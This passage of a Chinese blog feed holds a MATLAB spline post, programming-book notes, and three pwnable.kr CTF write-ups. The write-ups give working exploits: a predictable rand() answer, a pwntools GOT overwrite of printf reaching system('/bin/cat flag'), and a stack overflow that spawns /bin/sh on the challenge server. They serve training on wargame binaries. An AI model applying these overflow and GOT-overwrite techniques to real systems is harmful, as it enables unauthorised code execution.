x(<span class="built_in">i</span>):<span class="number">0.001</span>:x(<span class="built_in">i</span>+<span class="number">1</span>);</div><div class="line">    fprintf(<span class="string">'区间为[ %.3f : %.3f]\n'</span>,x(<span class="built_in">i</span>),x(<span class="built_in">i</span>+<span class="number">1</span>));</div><div class="line">    S = M(<span class="built_in">i</span>)*(x(<span class="built_in">i</span>+<span class="number">1</span>)-t)^<span class="number">3</span>/ (<span class="number">6</span>*h(<span class="built_in">i</span>)) + M(<span class="built_in">i</span>+<span class="number">1</span>)*(t - x(<span class="built_in">i</span>))^<span class="number">3</span>/(<span class="number">6</span>*h(<span class="built_in">i</span>))+(y(<span class="built_in">i</span>) - M(<span class="built_in">i</span>)*h(<span class="built_in">i</span>)^<span class="number">2</span>/<span class="number">6</span>)*(x(<span class="built_in">i</span>+<span class="number">1</span>) - t)/h(<span class="built_in">i</span>) + (y(<span class="built_in">i</span>+<span class="number">1</span>) - M(<span class="built_in">i</span>+<span class="number">1</span>)*h(<span class="built_in">i</span>)^<span class="number">2</span>/<span class="number">6</span>)*(t - x(<span class="built_in">i</span>))/h(<span class="built_in">i</span>)</div><div class="line">    s = M(<span class="built_in">i</span>)*(x(<span class="built_in">i</span>+<span class="number">1</span>)-k).^<span class="number">3</span>/ (<span class="number">6</span>*h(<span class="built_in">i</span>)) + M(<span class="built_in">i</span>+<span class="number">1</span>)*(k - x(<span class="built_in">i</span>)).^<span class="number">3</span>/(<span class="number">6</span>*h(<span class="built_in">i</span>))+(y(<span class="built_in">i</span>) - M(<span class="built_in">i</span>)*h(<span class="built_in">i</span>)^<span class="number">2</span>/<span class="number">6</span>)*(x(<span class="built_in">i</span>+<span class="number">1</span>) - k)/h(<span class="built_in">i</span>) + (y(<span class="built_in">i</span>+<span class="number">1</span>) - M(<span class="built_in">i</span>+<span class="number">1</span>)*h(<span class="built_in">i</span>)^<span class="number">2</span>/<span class="number">6</span>)*(k - x(<span class="built_in">i</span>))/h(<span class="built_in">i</span>);</div><div class="line">    hold on;</div><div class="line">    plot(k,s);</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
<h1 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h1><p>测试例题：《计算方法》（李庆扬版）P44 例7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">&gt;&gt; sanciyangtiao</div><div class="line">输入横坐标，格式:[x1 x2 …… xn]</div><div class="line">[27.7 28 29 30]</div><div class="line"></div><div class="line">x =</div><div class="line"></div><div class="line">   27.7000   28.0000   29.0000   30.0000</div><div class="line"></div><div class="line">输入纵坐标，格式:[y1 y2 …… yn]</div><div class="line">[4.1 4.3 4.1 3.0]</div><div class="line"></div><div class="line">y =</div><div class="line"></div><div class="line">    4.1000    4.3000    4.1000    3.0000</div><div class="line"></div><div class="line">请选择边界条件：①已知两端一阶导数值，②已知两端二阶导数值。选择 1 or 2 :1</div><div class="line">x1 的 一阶导数值：3.0</div><div class="line">xn 的 一阶导数值：-4.0</div><div class="line">计算 h 结果为:</div><div class="line"></div><div class="line">h =</div><div class="line"></div><div class="line">    0.3000    1.0000    1.0000</div><div class="line"></div><div class="line">计算 μ 结果为:</div><div class="line"></div><div class="line">u =</div><div class="line"></div><div class="line">    0.2308    0.5000    1.0000</div><div class="line"></div><div class="line">计算 λ 结果为：</div><div class="line"></div><div class="line">lamda =</div><div class="line"></div><div class="line">    1.0000    0.7692    0.5000</div><div class="line"></div><div class="line">计算 d 的结果：</div><div class="line"></div><div class="line">d =</div><div class="line"></div><div class="line">  -46.6667   -4.0000   -2.7000  -17.4000</div><div class="line"></div><div class="line">求得 M 结果:</div><div class="line"></div><div class="line">M =</div><div class="line"></div><div class="line">  -23.5314</div><div class="line">    0.3960</div><div class="line">    0.8297</div><div class="line">   -9.1149</div><div class="line"></div><div class="line">区间为[ 27.700 : 28.000]</div><div class="line"></div><div class="line">S =</div><div class="line"></div><div class="line">(35650*(t - 28)^3)/2727 - (107*t)/202 + (200*(t - 277/10)^3)/909 + 19317/1010</div><div class="line"></div><div class="line">区间为[ 28.000 : 29.000]</div><div class="line"></div><div class="line">S =</div><div class="line"></div><div class="line">(419*(t - 28)^3)/3030 - (55*t)/202 - (20*(t - 29)^3)/303 + 35929/3030</div><div class="line"></div><div class="line">区间为[ 29.000 : 30.000]</div><div class="line"></div><div class="line">S =</div><div class="line"></div><div class="line">(563*t)/1010 - (4603*(t - 29)^3)/3030 - (419*(t - 30)^3)/3030 - 36977/3030</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170409/MATLAB/1.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;三次样条插值之MATLAB实现&lt;br&gt;
    
    </summary>
    
      <category term="Course" scheme="http://yoursite.com/categories/Course/"/>
    
    
      <category term="计算方法" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/"/>
    
      <category term="matlab" scheme="http://yoursite.com/tags/matlab/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr:random</title>
    <link href="http://yoursite.com/2017/04/09/Pwnable-kr-random/"/>
    <id>http://yoursite.com/2017/04/09/Pwnable-kr-random/</id>
    <published>2017-04-09T01:31:08.000Z</published>
    <updated>2017-06-30T08:17:41.020Z</updated>
    
    <content type="html"><![CDATA[<p>伪随机<br><a id="more"></a></p>
<h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>先file看一下<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170409/random/1.jpg?raw=true" alt=""></p>
<p>IDA打开</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170409/random/2.jpg?raw=true" alt=""></p>
<p>可以看到程序读入 v4 ，跟 v5 进行异或操作，若结果为  0xDEADBEEF ，则可以读取到flag。其中 v5的初始值由 rand（）指定。</p>
<h1 id="rand（）"><a href="#rand（）" class="headerlink" title="rand（）"></a>rand（）</h1><p>rand（）产生伪随机数。伪随机数的“随机”之处是它的种子（seed）。种子确定后，按照一定算法所计算出来的随机数序列也就完全确定了。</p>
<p>C语言中，可以通过 srand() 来指定种子（seed）。如果用户在调用 rand（）之前没有调用过 srand（），则系统默认种子为 1 。测试如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random1;</div><div class="line">	random1 = rand();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"No srand():\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"random1 = %u\n"</span>, random1);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random2;</div><div class="line">	srand(<span class="number">1</span>);</div><div class="line">	random2 = rand();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"srand(1):\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"random2 = %u\n"</span>, random2);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random3;</div><div class="line">	srand(<span class="number">2</span>);</div><div class="line">	random3 = rand();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"srand(2):\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"random3 = %u\n"</span>, random3);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170409/random/3.jpg?raw=true" alt=""></p>
<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>由以上分析可知，v5的值其实是确定的，为 1804289383。<br>而判断条件(v5 ^ v4) == 0xDEADBEEF 等价于 v4 == 0xDEADBEEF ^ v5 。运算可得 1804289383 ^ 0xDEADBEEF = 3039230856。所以我们要给 v4 传入 3039230856 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">random@ubuntu:~$ ./random</div><div class="line">3039230856                  </div><div class="line">Good!</div><div class="line">Mommy, I thought libc random is unpredictable...</div></pre></td></tr></table></figure>
<p>FLAG: Mommy, I thought libc random is unpredictable…</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;伪随机&lt;br&gt;
    
    </summary>
    
      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr:passcode</title>
    <link href="http://yoursite.com/2017/04/08/Pwnable-kr-passcode/"/>
    <id>http://yoursite.com/2017/04/08/Pwnable-kr-passcode/</id>
    <published>2017-04-08T02:42:32.000Z</published>
    <updated>2017-06-30T08:17:46.004Z</updated>
    
    <content type="html"><![CDATA[<p>简单GOT覆写<br><a id="more"></a></p>
<h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p>先file看一下，32位。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/1.jpg?raw=true" alt=""></p>
<p>用IDA打开，f5</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/2.jpg?raw=true" alt=""></p>
<p>可以看到，在调用完 welcome() 后立即调用了 login()。也就是说，welcome()栈帧的栈底 和 login()栈帧的栈底 是一样的。</p>
<h2 id="welcome（）"><a href="#welcome（）" class="headerlink" title="welcome（）"></a>welcome（）</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/3.jpg?raw=true" alt=""></p>
<p>通过 __isoc99_scanf() 读取name字符串，字符串大小为100。且由<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int v1; // [sp+18h] [bp-10h]@0</div></pre></td></tr></table></figure></p>
<p>这一行可知，在 welcome() 的栈帧中，name字符串的起始位置在 ebp-70h 的地方。</p>
<h2 id="login（）"><a href="#login（）" class="headerlink" title="login（）"></a>login（）</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/4.jpg?raw=true" alt=""></p>
<p>这里分别通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__isoc99_scanf(&quot;%d&quot;)</div></pre></td></tr></table></figure></p>
<p>来获得 passcode1 和 passcode2  的值。要注意的是，这里  scanf(“%d”) 中没有出现取地址符，也就是说，scanf(“%d”) 会直接把栈上的数据当作指针，并将读入的数据存放到这个“指针”指的“地址”上。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/7.jpg?raw=true" alt=""><br>以第一个红框为例，它对应着 passcode1 的读入。scanf的参数有两个，第一个是格式化字符串，第二个是地址表列。按照参数从右到左入栈。所以下面这段话，将 ebp-0x10 处的数据 放到了 esp+0x4 处 作为了 scanf的地址表项参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">804857c:	8b 55 f0             	mov    edx,DWORD PTR [ebp-0x10]</div><div class="line">804857f:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx</div></pre></td></tr></table></figure></p>
<p>scanf的第一个参数即 格式化字符串 由下面这两句话传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">8048577:	b8 83 87 04 08        mov    eax,0x8048783</div><div class="line">省略</div><div class="line">8048583:	89 04 24              mov    DWORD PTR [esp],eax</div></pre></td></tr></table></figure></p>
<p>0x8048783 处的数据如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/8.jpg?raw=true" alt=""><br>所以对于第一个 scanf(), 它的第二个参数的数值为在login（）栈帧的 ebp-0x10 处的数据。</p>
<p>对于passcode2 的分析同理。</p>
<h1 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h1><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>从login（）的逻辑来看，只要 v1 = 0x528E6 和 0xCC07C9 程序就能执行到 return system（）。而且 welcome（）和 login（） 的 ebp 是相同的，有没有可能通过构造 welcome的输入 来控制 v1 v2 的值呢？</p>
<p>从前边的ida分析来看，在login（）的栈帧中，passcode1位置在 ebp-10h, 在welcome（）栈帧中，name字符串起始位置在 ebp-70h。由于welcome（）和login（）调用连续，他们的栈帧的ebp其实是一样的。如下图，两个栈帧对比如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/6.jpg?raw=true" alt=""></p>
<p>70h - 10h = 60h = 96 &lt; 100。也就是说，我们在welcome（）中输入的name的第 97 - 100 的字符，在 login（）栈帧中恰好是作为第一个 scanf 的第二个参数（即地址表项）。而在login（）中，调用第一次 scanf 时传入的 %d 将会写到这个地址中。这样我们能控制 passcode1。</p>
<p>用peda的checksec检查发现开启了canary保护<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/5.jpg?raw=true" alt=""></p>
<p>由于passcode1已经是在长度为100的name的最后四个字节，因此不可能通过继续增加name的输入来控制 passcode2，否则会触发canary。</p>
<h2 id="科普：GOT"><a href="#科普：GOT" class="headerlink" title="科普：GOT"></a>科普：GOT</h2><p>linux中，ELF编译系统采用了一种叫延迟绑定（lazy binding）的技术。若ELF文件调用了定义在共享库中的函数，那ELF文件中就存在 GOT（全局偏移表） 和 PLT（过程链接表），其中GOT存放在 .data 段（已初始化的全局C变量），而PLT存放在 .text 段（已编译程序的机器代码）。对于一般函数，PLT表和GOT表一一对应。</p>
<p>当第一次调用共享库中的函数时，该函数对应的GOT表项中存放的是对应PLT表中的push1条目的地址。程序调用时，执行函数对应PLT的第一条指令时会先通过对应GOT跳转到PLT表中的下一条指令，之后通过一系列操作，将对应GOT覆盖为函数的真实地址，并执行该函数。等到下一次调用该函数时，程序一样先执行函数对应PLT的第一条指令，之后通过GOT表会直接执行该函数，因为GOT表中已经是函数的真实地址了。</p>
<h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><p>通过之前的分析，我们能通过控制name的最后四个字节，结合passcode1的scanf来实现对任意地址的写入。加上 GOT表是在 .data 段，是可写的。因此一个想法就是：我们可以将 printf 的GOT表 覆写为 system函数的地址。由前可知，当再次调用 printf 时，会通过 printf的GOT表执行 system函数。</p>
<p>printf 的 GOT地址可以通过 pwntools 工具获得。也可以通过 objdump 获得，如下.<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/10.jpg?raw=true" alt=""></p>
<p>对于system函数地址，由于程序中已经提供了，所以这里直接取 80485e3</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/12.jpg?raw=true" alt=""></p>
<p>这里对应着login（）中的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">return system(&quot;/bin/cat flag&quot;);</div></pre></td></tr></table></figure></p>
<p>梳理一下思路：按照程序的流程，welcome（），我们输入100个字符，其中最后四个是 printf的GOT地址。之后程序进入login，调用scanf（”%d”）时，以 %d 形式将我们输入的数据（ system(“/bin/cat flag”)）读入，并写入到 printf的GOT地址。接下去，程序会执行 printf(“enter passcode2 : “); 即再次调用printf函数，但实际执行的是 system函数。<br>要注意的是，由于是以 %d 形式读入，所以输入时应为 134514147 （0x80485e3 = 134514147）</p>
<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">elf = ELF(<span class="string">"passcode"</span>)</div><div class="line">r = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"12345"</span>)</div><div class="line"><span class="comment">#r = process("./passcode")</span></div><div class="line"></div><div class="line"></div><div class="line">printfGotAddr = elf.got[<span class="string">"printf"</span>]</div><div class="line">systemAddr = <span class="number">134514147</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"the printfGotAddr is "</span>+ hex(printfGotAddr)</div><div class="line"><span class="keyword">print</span> <span class="string">"the systemAddr is "</span>+ hex(systemAddr)</div><div class="line"></div><div class="line">payload1 = <span class="string">'a'</span> * <span class="number">96</span> + p32(printfGotAddr)</div><div class="line">payload2 = str(systemAddr)</div><div class="line">r.sendline(payload1)</div><div class="line">r.sendline(payload2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recv()</div></pre></td></tr></table></figure>
<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><h2 id="local-test"><a href="#local-test" class="headerlink" title="local test"></a>local test</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/pwnable/passcode$ python exp.py</div><div class="line">[*] &apos;/home/chybeta/pwn/pwnable/passcode/passcode&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">[+] Opening connection to 127.0.0.1 on port 12345: Done</div><div class="line">the printfGotAddr is 0x804a000</div><div class="line">the systemAddr is 0x80485e3</div><div class="line">flag&#123;2222222222&#125;</div><div class="line">[*] Closed connection to 127.0.0.1 port 12345</div></pre></td></tr></table></figure>
<h2 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">passcode@ubuntu:~$ ls</div><div class="line">flag  passcode	passcode.c</div><div class="line">passcode@ubuntu:~$ python</div><div class="line">Python 2.7.12 (default, Jul  1 2016, 15:12:24)</div><div class="line">[GCC 5.4.0 20160609] on linux2</div><div class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</div><div class="line">&gt;&gt;&gt; from pwn import *</div><div class="line">&gt;&gt;&gt; e = ELF(&quot;passcode&quot;)</div><div class="line">[*] &apos;/home/passcode/passcode&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">&gt;&gt;&gt; r = process(&quot;./passcode&quot;)</div><div class="line">[x] Starting local process &apos;./passcode&apos;</div><div class="line">[+] Starting local process &apos;./passcode&apos;: Done</div><div class="line">&gt;&gt;&gt; printfGotAddr = e.got[&quot;printf&quot;]</div><div class="line">&gt;&gt;&gt; systemAddr = 134514147</div><div class="line">&gt;&gt;&gt; payload1 = &apos;a&apos; * 96 + p32(printfGotAddr)</div><div class="line">&gt;&gt;&gt; payload2 = str(systemAddr)</div><div class="line">&gt;&gt;&gt; r.sendline(payload1)</div><div class="line">&gt;&gt;&gt; r.sendline(payload2)</div><div class="line">&gt;&gt;&gt; print r.recv()</div><div class="line">[*] Process &apos;./passcode&apos; stopped with exit code 0</div><div class="line">Toddler&apos;s Secure Login System 1.0 beta.</div><div class="line">enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</div><div class="line">Sorry mom.. I got confused about scanf usage :(</div><div class="line">enter passcode1 : Now I can safely trust you that you have credential :)</div></pre></td></tr></table></figure>
<p>FLAG: Sorry mom.. I got confused about scanf usage :(</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;简单GOT覆写&lt;br&gt;
    
    </summary>
    
      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr:bof</title>
    <link href="http://yoursite.com/2017/04/07/Pwnable-kr-bof/"/>
    <id>http://yoursite.com/2017/04/07/Pwnable-kr-bof/</id>
    <published>2017-04-07T12:36:21.000Z</published>
    <updated>2017-06-30T08:17:48.405Z</updated>
    
    <content type="html"><![CDATA[<p>简单栈溢出。<br><a id="more"></a></p>
<h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p>原题有提供binary和source code。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/pwnable/bof$ file bof</div><div class="line">bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped</div></pre></td></tr></table></figure>
<p>用IDA打开，f5:</p>
<p>main函数：<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170407/bof1.jpg?raw=true" alt=""></p>
<p>func函数：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170407/bof2.jpg?raw=true" alt=""></p>
<p>func函数接受一个参数（0xDEADBEEF），之后通过gets（）接受输入。因此可以通过栈溢出，将a1覆盖为0xCAFEBABE，这样能直接执行 system(“/bin/sh”)</p>
<p>a1 是 func（）的参数，在栈上位于 ebp+8h 的位置。而输入字符串的起点为 ebp-2ch。两者相差：0x2c + 0x8h = 52 。</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = remote(<span class="string">"pwnable.kr"</span>,<span class="string">"9000"</span>)</div><div class="line">payload = <span class="string">'a'</span> * <span class="number">52</span></div><div class="line">payload += p32(<span class="number">0xcafebabe</span>)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170407/bof3.jpg?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;简单栈溢出。&lt;br&gt;
    
    </summary>
    
      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>《The Pracetice of Programming》读书笔记（1）</title>
    <link href="http://yoursite.com/2017/04/06/%E3%80%8AThe-Pracetice-of-Programming%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89/"/>
    <id>http://yoursite.com/2017/04/06/《The-Pracetice-of-Programming》读书笔记（1）/</id>
    <published>2017-04-06T07:46:47.000Z</published>
    <updated>2017-04-06T08:04:34.647Z</updated>
    
    <content type="html"><![CDATA[<p>《The Pracetice of Programming》读书笔记<br><a id="more"></a></p>
<h1 id="Style"><a href="#Style" class="headerlink" title="Style"></a>Style</h1><ul>
<li><p>Usually,the real code is mostly well down,but with something that could be improved.</p>
</li>
<li><p>There is more to writing a program than getting the syntax right, fixing the bugs, and making it run fast enough.</p>
</li>
<li><p>The principles of programming style are based on common sense guided by experience.</p>
</li>
</ul>
<h2 id="Names"><a href="#Names" class="headerlink" title="Names"></a>Names</h2><ul>
<li><p>labels an object and conveys information about its purpose.</p>
</li>
<li><p>informative、concise、memorable, and pronounceable if possible</p>
</li>
<li><p>the border the scope,the more information conveyed.</p>
</li>
</ul>
<h3 id="suggestion-1"><a href="#suggestion-1" class="headerlink" title="suggestion 1"></a>suggestion 1</h3><p>use descriptive name for globals,short names for locals.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;《The Pracetice of Programming》读书笔记&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
